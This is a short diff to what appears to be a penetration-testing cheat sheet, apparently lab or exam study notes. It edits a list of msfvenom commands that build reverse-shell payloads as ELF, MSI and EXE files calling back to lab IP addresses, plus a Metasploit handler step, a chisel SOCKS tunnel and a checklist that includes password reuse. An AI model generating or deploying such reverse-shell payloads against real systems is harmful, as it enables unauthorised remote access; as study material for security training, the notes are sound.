@@ -300,8 +300,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[MY_IP_ADDR] LPORT=4444 -f [as
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.134 LPORT=4242 -f elf > reverse.elf
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.74 LPORT=21 -f msi> evil.msi
 msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.119.219 lport=8888 -f exe -a x64 > vuln64.exe
-# no need exploit/multi/handler v
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.131 LPORT=21 -f msi > priv.msi
+
 ----------------------------------
 msfconsole:
 use exploit/multi/handler
@@ -382,4 +381,4 @@ chisel.exe server -p 8080 --socks5
 
 :white\_check\_mark: port scan\
 :white\_check\_mark: password reuse\
-:white\_check\_mark: check version for vulnerabilities and exploit\\
+:white\_check\_mark: check version for vulnerabilities and exploit\
